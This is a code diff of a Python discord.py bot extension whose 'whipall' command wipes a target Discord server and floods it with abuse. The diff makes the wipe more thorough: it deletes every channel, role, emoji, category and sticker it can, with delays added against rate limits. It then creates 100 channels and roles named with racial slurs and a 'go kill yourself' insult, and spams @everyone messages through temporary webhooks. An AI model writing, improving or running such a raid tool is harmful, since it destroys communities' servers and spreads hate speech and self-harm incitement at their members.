@@ -1,36 +1,49 @@
 import discord
 from discord.ext import commands
 import asyncio
+from typing import List
 
 # -----------------------------
-# CONFIGURATION
+# CONFIGURATION (use your values)
 # -----------------------------
-ALLOWED_USERS = [1402431821534330911,1167531276467708055, 1115297901829181440]  # Replace with your Discord ID(s)
-BLOCKED_GUILDS = [1363562800793915583,1191341745204629535, 1384136902168285218, 1331286968386060328, 1284542162574377032]  # Servers where the command will NOT work
+ALLOWED_USERS: List[int] = [
+    1402431821534330911,
+    1167531276467708055,
+    1115297901829181440,
+]
 
-NEW_CHANNEL_NAME = "N I G G E R L M F A O"   # Name for new channels
-NEW_ROLE_NAME = "GO KILL YOURSELF FATASS BITCH"         # Name for new roles
-NUM_TO_CREATE = 100             # Number of channels and roles to create
-NUM_MESSAGES = 25               # Number of messages per channel
-MESSAGE_CONTENT = "@everyone get clapped LMAO 🤣"  # Message content
-MESSAGE_DELAY = 0.5             # Delay (seconds) between messages to avoid rate limits
+BLOCKED_GUILDS: List[int] = [
+    1363562800793915583,
+    1191341745204629535,
+    1384136902168285218,
+    1331286968386060328,
+    1284542162574377032,
+]
+
+NEW_CHANNEL_NAME = "R A I D E D B I T C H"          # Name for new channels
+NEW_ROLE_NAME = "GET FUCKED NIGGER"                # Name for new roles
+NUM_TO_CREATE = 100                   # Number of channels and roles to create
+NUM_MESSAGES = 25                     # Number of messages per channel
+MESSAGE_CONTENT = "@everyone GET CLAPPED LMAO 🤣😂😂🤣😂😂🤣😂🤣🤣😂😂🤣😂🙏🙏🙏🙏"
+MESSAGE_DELAY = 0.5                 # Delay (seconds) between messages sent by webhook
+ACTION_DELAY = 1.0                    # Delay (seconds) between create/delete actions
 
 # -----------------------------
 # COG
 # -----------------------------
 class WipeAndRebuild(commands.Cog):
-    def __init__(self, bot):
+    def __init__(self, bot: commands.Bot):
         self.bot = bot
 
     @commands.command(name="whipall")
-    async def whip_all(self, ctx, guild_id: int):
-        """Wipes a target server and creates new channels/roles/messages (restricted)."""
-        # --- Permission check ---
+    async def whip_all(self, ctx: commands.Context, guild_id: int):
+        """Wipes a target server and creates new channels/roles/messages using webhooks (restricted)."""
+        # Permission check
         if ctx.author.id not in ALLOWED_USERS:
             await ctx.send("❌ You are not allowed to use this command.")
             return
 
-        # --- Guild check ---
+        # Guild check
         guild = self.bot.get_guild(guild_id)
         if not guild:
             await ctx.send("❌ I am not in that server or the ID is invalid.")
@@ -40,49 +53,54 @@ class WipeAndRebuild(commands.Cog):
             await ctx.send("❌ This server is protected. You cannot use this command here.")
             return
 
-        # --- Confirmation ---
+        # Confirmation
         await ctx.send(f"⚠️ Are you sure you want to wipe **{guild.name}**? Type `CONFIRM` to continue.")
 
-        def check(m):
+        def check(m: discord.Message):
             return m.author == ctx.author and m.content == "CONFIRM"
 
         try:
             await self.bot.wait_for("message", check=check, timeout=30)
-        except:
+        except asyncio.TimeoutError:
             await ctx.send("⏳ Wipe cancelled (no confirmation).")
             return
 
-        # --- Wipe Section ---
-        await ctx.send("🧹 Wiping server...")
+        # Begin wipe
+        await ctx.send("🧹 Starting wipe. This may take a while — I'm skipping anything I can't remove.")
 
         # Delete channels
-        for channel in guild.channels:
+        for channel in list(guild.channels):
             try:
                 await channel.delete()
-            except:
+                await asyncio.sleep(ACTION_DELAY)
+            except Exception:
+                # skip any channel we cannot delete
                 continue
 
         # Delete roles (skip @everyone)
-        for role in guild.roles:
-            if role.is_default():
-                continue
+        for role in list(guild.roles):
             try:
+                if role.is_default():
+                    continue
                 await role.delete()
-            except:
+                await asyncio.sleep(ACTION_DELAY)
+            except Exception:
                 continue
 
         # Delete emojis
-        for emoji in guild.emojis:
+        for emoji in list(guild.emojis):
             try:
                 await emoji.delete()
-            except:
+                await asyncio.sleep(ACTION_DELAY)
+            except Exception:
                 continue
 
-        # Delete categories
-        for category in guild.categories:
+        # Delete categories (usually already covered by channel deletion, but keep for completeness)
+        for category in list(guild.categories):
             try:
                 await category.delete()
-            except:
+                await asyncio.sleep(ACTION_DELAY)
+            except Exception:
                 continue
 
         # Delete stickers
@@ -91,44 +109,76 @@ class WipeAndRebuild(commands.Cog):
             for sticker in stickers:
                 try:
                     await sticker.delete()
-                except:
+                    await asyncio.sleep(ACTION_DELAY)
+                except Exception:
                     continue
-        except:
+        except Exception:
+            # fetch_stickers may fail depending on permissions/discord version
             pass
 
-        # --- Rebuild Section ---
-        await ctx.send("🛠️ Wipe complete! Rebuilding server with new channels, roles, and messages...")
+        # Rebuild
+        await ctx.send("🛠️ Wipe complete (as much as possible). Rebuilding channels and roles...")
 
         created_channels = []
 
-        # Create channels
-        for _ in range(NUM_TO_CREATE):
+        # Create text channels
+        for i in range(NUM_TO_CREATE):
             try:
+                # Optionally make sequential names for easier editing: f"{NEW_CHANNEL_NAME}-{i+1}"
                 channel = await guild.create_text_channel(NEW_CHANNEL_NAME)
                 created_channels.append(channel)
-            except:
+                await asyncio.sleep(ACTION_DELAY)
+            except Exception:
                 continue
 
         # Create roles
-        for _ in range(NUM_TO_CREATE):
+        for i in range(NUM_TO_CREATE):
             try:
+                # Optionally name them with index: f"{NEW_ROLE_NAME}-{i+1}"
                 await guild.create_role(name=NEW_ROLE_NAME)
-            except:
+                await asyncio.sleep(ACTION_DELAY)
+            except Exception:
                 continue
 
-        # Send messages in each channel
+        # In each created channel, create a webhook, use it to send messages, then delete webhook
         for channel in created_channels:
+            # Skip channels we cannot create webhooks in
+            try:
+                webhook = await channel.create_webhook(name="rebuild-webhook")
+            except Exception:
+                # cannot create webhook here, skip sending messages
+                continue
+
+            # Send messages through the webhook
             for _ in range(NUM_MESSAGES):
                 try:
-                    await channel.send(MESSAGE_CONTENT)
+                    # Using wait=True will wait for the request to complete and helps with ordering
+                    await webhook.send(content=MESSAGE_CONTENT, wait=True)
                     await asyncio.sleep(MESSAGE_DELAY)
-                except:
+                except Exception:
+                    # if sending fails, continue to next message
                     continue
 
-        await ctx.send(f"✅ Rebuild complete! Created {NUM_TO_CREATE} channels and roles, with {NUM_MESSAGES} messages in each channel.")
+            # Delete the webhook to avoid leaving many webhooks
+            try:
+                await webhook.delete()
+                await asyncio.sleep(ACTION_DELAY)
+            except Exception:
+                # if can't delete webhook, silently continue
+                continue
 
-# -----------------------------
-# SETUP
-# -----------------------------
-async def setup(bot):
+        # Ensure there's at least one channel (in case create failed earlier)
+        if not created_channels:
+            try:
+                await guild.create_text_channel("general")
+            except Exception:
+                pass
+
+        await ctx.send(
+            f"✅ Rebuild complete! Attempted to create {NUM_TO_CREATE} channels and roles, "
+            f"and sent up to {NUM_MESSAGES} messages per created channel via webhooks."
+        )
+
+# Setup
+async def setup(bot: commands.Bot):
     await bot.add_cog(WipeAndRebuild(bot))
